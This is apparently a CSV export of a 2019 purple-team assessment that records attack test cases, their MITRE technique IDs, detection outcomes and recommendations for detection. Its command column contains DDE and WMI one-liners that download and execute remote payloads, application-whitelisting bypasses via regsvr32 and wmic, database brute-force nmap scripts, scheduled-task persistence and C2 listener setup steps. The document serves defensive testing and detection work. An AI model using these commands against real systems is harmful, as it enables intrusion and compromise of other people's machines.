AssessmentGroup,Campaign,Phase,Variant,MitreID,CapecId,Method,Status,Outcome,Alert Severity,Alert Triggered,Activity Logged,Outcome Notes,Detection Recommendations,SourceIps,TargetAssets,ExpectedDetectionLayers,DetectingTools,Start Time,Start Time Epoch,Stop Time,Stop Time Epoch,Detection Time,Detection Time Epoch,Organizations,Tags,Objective,Command,References,Liklihood,Risk,Internal/External,Stealth,Attack Vector,Attack Complexity,Privileges Required,Attacker Tools
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,9 - Macro - MSBuild,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2019-01-10T14:02:12.197Z,1547128932197,2019-01-10T14:32:21.197Z,1547130741197,2019-01-28T22:06:01.716Z,1548713161716,Security Risk Advisors,,Execute malicious Office document on the endpoint,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,6 - Macro - MMG WMI PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,Yes,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Ketsui,2019-01-11T09:38:06.197Z,1547199486197,2019-01-11T09:44:44.197Z,1547199884197,2019-01-11T10:00:25.197Z,1547200825197,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,7 - Macro - MMG WMI Exe,T1203,,Client-side Execution,Completed,Detected,High,Yes,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2019-01-11T10:47:28.197Z,1547203648197,2019-01-11T12:40:58.197Z,1547210458197,2019-01-29T08:06:07.884Z,1548749167884,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,3 - Macro - WScript PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,Yes,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Ketsui,2019-01-10T08:43:24.197Z,1547109804197,2019-01-10T09:39:45.197Z,1547113185197,2019-01-10T10:33:22.197Z,1547116402197,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,8 - Macro - LuckyStrike PowerShell CellEmbed,T1203,,Client-side Execution,Completed,Blocked,TBD,Yes,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Ketsui,2019-01-10T16:27:35.197Z,1547137655197,2019-01-10T16:41:15.197Z,1547138475197,2019-01-28T22:04:44.900Z,1548713084900,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,11 - DDE - Exe,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",,2019-01-10T19:41:23.197Z,1547149283197,2019-01-10T20:30:00.197Z,1547152200197,2019-01-10T21:59:25.197Z,1547157565197,Security Risk Advisors,,Execute malicious Office document on the endpoint,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,5 - Macro - WScript PowerShell XOR,T1203,,Client-side Execution,Completed,Blocked,TBD,Yes,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Ketsui,2019-01-10T11:13:30.197Z,1547118810197,2019-01-10T12:16:12.197Z,1547122572197,2019-01-10T12:51:18.197Z,1547124678197,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,10 - DDE - PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,Yes,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Ketsui,2019-01-10T17:02:18.197Z,1547139738197,2019-01-10T17:07:20.197Z,1547140040197,2019-01-28T22:05:06.750Z,1548713106750,Security Risk Advisors,,Execute malicious Office document on the endpoint,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,2 - Macro - CobaltStrike Standard (MMG),T1203,,Client-side Execution,Completed,Detected,High,Yes,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2019-01-11T02:50:16.197Z,1547175016197,2019-01-11T04:07:57.197Z,1547179677197,2019-01-29T08:04:42.052Z,1548749082052,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,12 - Macro - Remote Template,T1203,,Client-side Execution,Completed,Detected,High,TBD,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2019-01-10T23:21:02.197Z,1547162462197,2019-01-11T00:08:47.197Z,1547165327197,2019-01-11T00:54:06.197Z,1547168046197,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,1 - Macro - Cobalt Strike Standard,T1203,,Client-side Execution,Completed,Detected,High,Yes,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2019-01-10T04:27:31.197Z,1547094451197,2019-01-10T05:24:12.197Z,1547097852197,2019-01-29T08:03:46.863Z,1548749026863,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Generate MS Office Macro from cobalt Strike (Attacks -> Packages -> MS Office Macro)

Put macro in office document

Execute the office document on endpoint",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - BloodHound,T1018,,Domain Enumeration,Completed,Detected,High,TBD,Yes,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Windows utilities used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics","DoDonpachi,Progear",2019-01-16T23:01:14.197Z,1547679674197,2019-01-16T23:39:00.197Z,1547681940197,2019-01-28T22:26:12.351Z,1548714372351,Security Risk Advisors,,"Use Bloodhound/Sharphound to preform queries across the local domain.

- Domain Group Memberships
- Domain Trusts
- Local Admins
- Sessions","Using SharpHound.ps1:
Invoke-BloodHound

Using SharpHound.exe:
SharpHound.exe",,High,Low,Internal,High,,,,
Enterprise Purple – 2019 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - LDAP using PowerShell,T1059.001,,Domain Enumeration,Completed,Detected,Info,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Legacy Windows and native PowerShell commands used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics","DoDonpachi,Progear",2019-01-16T18:30:59.197Z,1547663459197,2019-01-16T20:13:50.197Z,1547669630197,2019-01-28T22:25:59.060Z,1548714359060,Security Risk Advisors,,Use PowerView v3 to perform queries against the Windows domain for common groups.,"List All Admins:
Get-DomainGroupMember -Identity ""Administrators"" -Domain [FQDN] -Recurse | select MemberName | fl",,High,Low,Internal,High,,,,PowerView
Enterprise Purple – 2019 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - NSlookup,T1018,,Domain Enumeration,Completed,NotDetected,TBD,TBD,No,,"1) Large number of scripted nslookup commands potentially detected by EDR and/or SIEM solution, or behavioral monitoring tool",,,"SIEM,EDR,Behavior Analytics",,2019-01-17T01:57:39.197Z,1547690259197,2019-01-17T02:35:34.197Z,1547692534197,2019-01-17T03:31:48.197Z,1547695908197,Security Risk Advisors,,"Leverage the builtin ""nslookup"" command to perform queries against the local DNS servers for specific server information.","DNS Servers: nslookup -type=NS [FQDN]
Domain Controllers: nslookup -type=SRV _ldap._tcp.[FQDN]",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - NET,T1087,,Domain Enumeration,Completed,Detected,Low,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) EDR and/or SIEM rules are configured to detect use of native commands such as 'net' and modern PowerShell equivalents",,,"SIEM,EDR,Behavior Analytics",DoDonpachi,2019-01-16T14:57:45.197Z,1547650665197,2019-01-16T15:39:40.197Z,1547653180197,2019-01-28T22:25:38.856Z,1548714338856,Security Risk Advisors,,"Leverage the builtin ""net"" command to perform queries against the Windows domain for common groups.","Domain Controllers:
net group ""Domain Controllers"" /domain

Domain Admins:
net group ""Domain Admins"" /domain

Administrators of the Domain:
net localgroup ""Administrators"" /domain",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-12T16:36:23.197Z,1547310983197,2019-01-12T18:00:57.197Z,1547316057197,2019-01-28T22:12:18.597Z,1548713538597,Security Risk Advisors,,Spawn a new process using PowerShell.,powershell.exe <run command>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI Format Table,T1047,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",DoDonpachi,2019-01-13T17:32:08.197Z,1547400728197,2019-01-13T19:12:29.197Z,1547406749197,2019-01-28T22:19:38.855Z,1548713978855,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with WMI Format Table (Squiblytoo).,wmic os get /format:<url to xsl file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using MSBuild,,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2019-01-13T04:37:29.197Z,1547354249197,2019-01-13T06:07:04.197Z,1547359624197,2019-01-13T06:31:24.197Z,1547361084197,Security Risk Advisors,,Spawn a new process using MSBuild.,msbuild.exe <path to xml file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using HTA,T1218.005,,Trusted Windows Binary,Completed,Blocked,TBD,Yes,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Ketsui,2019-01-12T13:38:41.197Z,1547300321197,2019-01-12T14:02:15.197Z,1547301735197,2019-01-12T14:51:38.197Z,1547304698197,Security Risk Advisors,,Spawn a new process using HTA.,mshta <full path to hta>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using Regsvr32,T1218.010,,Trusted Windows Binary,Completed,Detected,High,Yes,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-12T10:41:39.197Z,1547289699197,2019-01-12T12:38:49.197Z,1547296729197,2019-01-29T07:54:41.882Z,1548748481882,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with Regsvr32 (Squiblydoo).,regsvr32 /s /n /u /i:<path to scriptlet> scrobj.dll,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI,T1047,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-12T19:50:10.197Z,1547322610197,2019-01-12T20:26:32.197Z,1547324792197,2019-01-28T22:12:39.584Z,1548713559584,Security Risk Advisors,,Spawn a new process using WMI.,"wmic process call create ""powershell -nop -c 'IEX ((new-object net.webclient).downloadstring(https://somedomain/1234))'""",,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using VBS,T1059.004,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-13T02:25:44.197Z,1547346344197,2019-01-13T03:34:13.197Z,1547350453197,2019-01-28T22:19:13.021Z,1548713953021,Security Risk Advisors,,Spawn a new process using VBS.,cscript <path to vbs file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,High,Yes,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-13T07:35:26.197Z,1547364926197,2019-01-13T09:31:47.197Z,1547371907197,2019-01-29T08:19:58.571Z,1548749998571,Security Risk Advisors,,Run an obfuscated PowerShell command to run a malicious command.,invoke-obfuscation -> run command,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - CMD,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,,,,"EDR,Endpoint Protection",,2019-01-13T10:25:29.197Z,1547375129197,2019-01-13T11:18:24.197Z,1547378304197,2019-01-13T12:02:20.197Z,1547380940197,Security Risk Advisors,,Run an obfuscated CMD command to run a malicious command.,invoke-dosfuscation -> run command,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using JS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2019-01-12T22:54:22.197Z,1547333662197,2019-01-12T23:52:55.197Z,1547337175197,2019-01-13T00:58:31.197Z,1547341111197,Security Risk Advisors,,Spawn a new process using JS.,cscript <path to js file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,PowerShell Downgrade,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-13T13:20:40.197Z,1547385640197,2019-01-13T14:58:29.197Z,1547391509197,2019-01-28T22:15:15.607Z,1548713715607,Security Risk Advisors,,Execute PowerShell in a degraded version to avoid security controls in newer versions.,powershell.exe -v 2,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2019 Q1,Database Assault,Exploitation,Fingerprint and brute force MS SQL Server instances,T1110,,Database exploitation,Completed,Detected,High,TBD,TBD,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by SIEM or Database Activity Monitoring tool",,,SIEM,Progear,2019-01-18T16:24:18.197Z,1547828658197,2019-01-18T18:12:29.197Z,1547835149197,2019-01-18T18:21:09.197Z,1547835669197,Security Risk Advisors,,Attempt to exploit insecurely configured MS SQL Server databases on the network.,"Metasploit recon:
use auxiliary/scanner/mssql/mssql_ping

Nmap recon:
nmap -p 445 --script ms-sql-info <host>

Nmap brute force:
nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>",,High,High,Internal,Low,,,,"Nmap,SQLping3,Metasploit"
Enterprise Purple – 2019 Q1,Database Assault,Discovery,"Internal - Moderate Port Scan with 5 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Med,TBD,Yes,,"1) Internal port scanning activity detect by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",Batrider,2019-01-18T13:22:26.197Z,1547817746197,2019-01-18T14:52:00.197Z,1547823120197,2019-01-28T22:29:24.849Z,1548714564849,Security Risk Advisors,,Identify open ports and services for common DBMS platforms,,,High,Low,Both,Low,,,,Nmap
Enterprise Purple – 2019 Q1,Database Assault,Exploitation,Fingerprint and brute force MySQL databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,SIEM,,2019-01-18T18:43:23.197Z,1547837003197,2019-01-18T19:45:07.197Z,1547840707197,2019-01-18T20:39:07.197Z,1547843947197,Security Risk Advisors,,Attempt to exploit insecurely configured MySQL databases on the network.,,,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2019 Q1,Database Assault,Exploitation,Fingerprint and brute force DB2 databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,SIEM,,2019-01-19T00:02:33.197Z,1547856153197,2019-01-19T01:31:10.197Z,1547861470197,2019-01-19T02:48:53.197Z,1547866133197,Security Risk Advisors,,Attempt to exploit insecurely configured IBM DB2 databases on the network.,"nmap -sS -Pn -p1433,1521,1526,3306,523 --randomize-hosts -g 53 --open --script=broadcast-ms-sql-discover.nse,broadcast-db2-discover.nse,ms-sql-empty-password.nse,mysql-empty-password.nse, -oA output IPADDRESS",,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2019 Q1,Database Assault,Exploitation,Fingerprint and brute force Oracle databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,SIEM,,2019-01-18T22:32:55.197Z,1547850775197,2019-01-18T23:09:31.197Z,1547852971197,2019-01-18T23:19:44.197Z,1547853584197,Security Risk Advisors,,Attempt to exploit insecurely configured Oracle databases on the network.,,,High,High,Internal,Low,,,,"Oscanner,Nmap,Metasploit"
Enterprise Purple – 2019 Q1,Database Assault,Exfiltration,Pilfer sensitive data from compromised DBs,,,Database access,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to alert on suspicious logons to critical DB servers and databases.,2) Database activity monitoring tool or triggers are configured for highly sensitive DB tables and columns.,3) DLP tool successfully detects sensitive data movement from the server or leaving the network.",,,"DLP,SIEM",,2019-01-19T03:17:27.197Z,1547867847197,2019-01-19T04:20:09.197Z,1547871609197,2019-01-19T05:06:17.197Z,1547874377197,Security Risk Advisors,,Pilfer sensitive data from compromised DBs and send it outside the network.,,,Medium,High,Both,Medium,,,,
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,Detected,High,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics","MUSHA,Grind Stormer,Batrider",2019-01-11T13:48:44.197Z,1547214524197,2019-01-11T14:16:03.197Z,1547216163197,2019-01-28T22:06:45.177Z,1548713205177,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.",Create a http listener,,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTPS payload over tcp/443,T1571,,C2 channel,Completed,Detected,High,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics","MUSHA,Batrider",2019-01-11T17:33:51.197Z,1547228031197,2019-01-11T18:23:42.197Z,1547231022197,2019-01-28T22:07:13.358Z,1548713233358,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Install SSL Certs From Lets Encrypt onto the server

Create a https listener",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Beacon DNS over udp/53,T1571,,C2 channel,Completed,Blocked,TBD,No,No,,"1) SIEM rules are configured to detect and alert on suspicious DNS traffic,12 Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Firewall,EDR,Secure Baselines,Behavior Analytics",MUSHA,2019-01-12T04:29:25.197Z,1547267365197,2019-01-12T06:22:53.197Z,1547274173197,2019-01-28T22:08:43.441Z,1548713323441,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Purchase a domain name

Create a windows/beacon_dns/reverse_dns_txt listener",,Medium,High,Both,High,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTP payload over tcp/80,T1095,,C2 channel,Completed,Detected,Low,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",Batrider,2019-01-11T20:54:12.197Z,1547240052197,2019-01-11T21:57:10.197Z,1547243830197,2019-01-28T22:07:38.002Z,1548713258002,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTPS payload over tcp/443,T1095,,C2 channel,Completed,Detected,Low,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",Batrider,2019-01-11T23:12:09.197Z,1547248329197,2019-01-11T23:44:46.197Z,1547250286197,2019-01-28T22:07:56.393Z,1548713276393,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon SMB over tcp/445,T1571,,C2 channel,Completed,Blocked,TBD,No,TBD,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.,2) Suspicious SMB netconns and pivoting from internal systems is detected by EDR or behavioral tools. Examples may include unusual SMB connections from domain controllers and other critical assets.",,,"Firewall,EDR,Behavior Analytics",MUSHA,2019-01-12T06:53:15.197Z,1547275995197,2019-01-12T07:22:08.197Z,1547277728197,2019-01-12T07:39:14.197Z,1547278754197,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various SMB.",Generate default SMB beacon using cobalt strike,,Medium,High,Internal,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Empire Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,Detected,High,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics","MUSHA,Grind Stormer",2019-01-12T01:48:23.197Z,1547257703197,2019-01-12T02:03:32.197Z,1547258612197,2019-01-28T22:08:21.082Z,1548713301082,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","uselistener http

Stageless:
launchers <powershell or python> <listener name>

Staged:
usestager <stager-option>
set <option-name> <option-value>
execute",,Medium,High,Both,Medium,,,,Empire
Enterprise Purple – 2019 Q1,C2 Channels,Discovery,Egress Buster,T1046,,Network egress checks,Completed,Detected,Low,TBD,Yes,,1) Egress busting scan is detected by IDS/IPS or firewall,,,"Web Gateway,Firewall,Secure Baselines","MUSHA,Batrider",2019-01-12T08:05:32.197Z,1547280332197,2019-01-12T08:37:19.197Z,1547282239197,2019-01-28T22:09:31.518Z,1548713371518,Security Risk Advisors,,"Identify allowed egress services and ports, including all TCP ports and common UDP ports.",,,Low,Low,Internal,Low,,,,Egress Buster
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Use of schtasks.exe for persistent jobs,T1053,,Scheduled tasks,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows task scheduler events,,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-14T05:32:37.197Z,1547443957197,2019-01-14T07:19:22.197Z,1547450362197,2019-01-28T22:16:48.118Z,1548713808118,Security Risk Advisors,,Create a scheduled task,"schtasks /Create /SC DAILY /TN ""Malicious Task"" /TR ""C:MaliciousFile.bat"" /ST 09:00",,Medium,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence using .BAT file,T1547.001,,Registry Modification,Completed,Blocked,TBD,Yes,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Ketsui,2019-01-14T03:00:17.197Z,1547434817197,2019-01-14T03:18:30.197Z,1547435910197,2019-01-14T04:23:47.197Z,1547439827197,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
